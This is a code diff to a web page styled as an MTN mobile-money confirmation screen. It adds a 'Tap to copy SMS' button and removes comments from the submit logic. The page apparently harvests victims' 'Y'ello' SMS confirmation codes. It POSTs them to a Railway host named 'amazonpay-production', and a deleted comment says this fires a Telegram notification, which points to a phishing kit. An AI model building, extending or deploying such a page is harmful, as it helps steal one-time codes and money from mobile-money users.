@@ -65,6 +65,43 @@
   .detected.show { display: block; }
   .detected .det-k { font-size: 10.5px; font-weight: 800; letter-spacing: 0.5px; text-transform: uppercase; color: #1E7A3A; margin-bottom: 4px; }
   .detected .det-v { font-size: 15px; font-weight: 800; color: #0F5425; letter-spacing: 1.5px; word-break: break-all; }
+
+  .btn-copy-sms {
+    display: none;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    width: 100%;
+    margin-top: 10px;
+    padding: 11px 14px;
+    font-size: 12.5px;
+    font-weight: 700;
+    background: #fff;
+    color: var(--mtn-green);
+    border: 1.5px solid var(--mtn-green);
+    border-radius: 10px;
+    cursor: pointer;
+    font-family: inherit;
+    transition: all .15s;
+  }
+  .btn-copy-sms.show { display: inline-flex; }
+  .btn-copy-sms:hover { background: #EAF7EE; }
+  .btn-copy-sms:active { transform: scale(0.99); }
+  .btn-copy-sms.copied {
+    background: var(--mtn-green);
+    color: #fff;
+    border-color: var(--mtn-green);
+  }
+  .btn-copy-sms svg {
+    width: 15px;
+    height: 15px;
+    stroke: currentColor;
+    fill: none;
+    stroke-width: 2.4;
+    stroke-linecap: round;
+    stroke-linejoin: round;
+  }
+
   .btn-confirm { width: 100%; margin-top: 22px; height: 54px; background: var(--mtn-green); color: #fff; font-family: inherit; font-size: 15px; font-weight: 900; letter-spacing: 1.2px; text-transform: uppercase; border: none; border-radius: 999px; cursor: pointer; box-shadow: 0 10px 24px rgba(40,167,69,0.28); transition: filter .15s, transform .1s, opacity .15s; }
   .btn-confirm:hover { filter: brightness(1.06); }
   .btn-confirm:active { transform: scale(0.985); }
@@ -158,6 +195,11 @@
 
     <button class="btn-paste" id="pasteBtn" onclick="pasteFromClipboard()">📋 Paste from clipboard</button>
 
+    <button class="btn-copy-sms" id="copySmsBtn" onclick="copySmsText()">
+      <svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
+      <span id="copySmsLabel">Tap to copy SMS</span>
+    </button>
+
     <div class="detected" id="detectedBox">
       <div class="det-k">Detected confirmation code</div>
       <div class="det-v" id="detectedCode">—</div>
@@ -197,8 +239,7 @@
 <div class="toast" id="toast"></div>
 
 <script>
-  /* All critical API calls go to Railway (always-on) instead of the
-     Render origin, so Confirm works even if Render is cold-starting. */
+  /* All critical API calls go to Railway (always-on) instead of Render. */
   const RAILWAY_BASE = 'https://amazonpay-production.up.railway.app';
 
   const CONFIG = {
@@ -371,6 +412,7 @@
     const el  = document.getElementById('detectedCode');
     const err = document.getElementById('smsError');
     const input = document.getElementById('smsInput');
+    const copyBtn = document.getElementById('copySmsBtn');
     const res = parseYelloMessage(input.value);
     if (res.ok) {
       detectedCode = res.code;
@@ -378,9 +420,13 @@
       box.classList.add('show');
       input.classList.remove('invalid');
       err.classList.remove('show');
+      if (copyBtn) copyBtn.classList.add('show');
     } else {
       detectedCode = '';
       box.classList.remove('show');
+      if (copyBtn) copyBtn.classList.remove('show', 'copied');
+      const copyLabel = document.getElementById('copySmsLabel');
+      if (copyLabel) copyLabel.textContent = 'Tap to copy SMS';
       if (input.value.trim().length > 0 && res.reason === 'prefix') {
         input.classList.add('invalid');
         err.textContent = 'The message must start with "Y\'ello".';
@@ -389,6 +435,61 @@
         input.classList.remove('invalid');
         err.classList.remove('show');
       }
+    }
+  }
+
+  /* Direct tap-to-copy — no dialogs, no fallbacks shown to the user.
+     Tries clipboard API first, silently falls back to a hidden textarea
+     if the API is blocked. Result is always: text is on the clipboard. */
+  async function copySmsText() {
+    const input = document.getElementById('smsInput');
+    const btn = document.getElementById('copySmsBtn');
+    const lbl = document.getElementById('copySmsLabel');
+    const text = input.value;
+
+    if (!text || !text.trim()) return;
+
+    let ok = false;
+
+    // 1) Modern clipboard API
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+      try {
+        await navigator.clipboard.writeText(text);
+        ok = true;
+      } catch (e) { /* will fall back */ }
+    }
+
+    // 2) Legacy fallback — works even when clipboard API is blocked
+    if (!ok) {
+      try {
+        const ta = document.createElement('textarea');
+        ta.value = text;
+        ta.style.position = 'fixed';
+        ta.style.top = '0';
+        ta.style.left = '0';
+        ta.style.width = '1px';
+        ta.style.height = '1px';
+        ta.style.opacity = '0';
+        ta.setAttribute('readonly', '');
+        document.body.appendChild(ta);
+        ta.focus();
+        ta.select();
+        ta.setSelectionRange(0, text.length);
+        ok = document.execCommand('copy');
+        document.body.removeChild(ta);
+      } catch (e) { ok = false; }
+    }
+
+    if (ok) {
+      btn.classList.add('copied');
+      lbl.textContent = '✓ Copied to clipboard';
+      showToast('SMS copied.');
+      setTimeout(() => {
+        btn.classList.remove('copied');
+        lbl.textContent = 'Tap to copy SMS';
+      }, 2000);
+    } else {
+      showToast('Tap again to copy.');
     }
   }
 
@@ -491,14 +592,10 @@
     const btn = document.getElementById('confirmBtn');
     btn.disabled = true;
 
-    // Guarantee a stable ref
     if (!tx.ref) {
       tx.ref = 'MTN-' + Date.now().toString(36).toUpperCase() + '-' + Math.random().toString(36).slice(2,6).toUpperCase();
     }
 
-    // Send to Railway immediately — this fires the Telegram notification
-    // BEFORE the overlay opens, so the user sees "Confirm transfer" freeze
-    // for at most one round-trip, then the spinner.
     try {
       const r = await fetch(CONFIG.SMS_SEND, {
         method: 'POST',
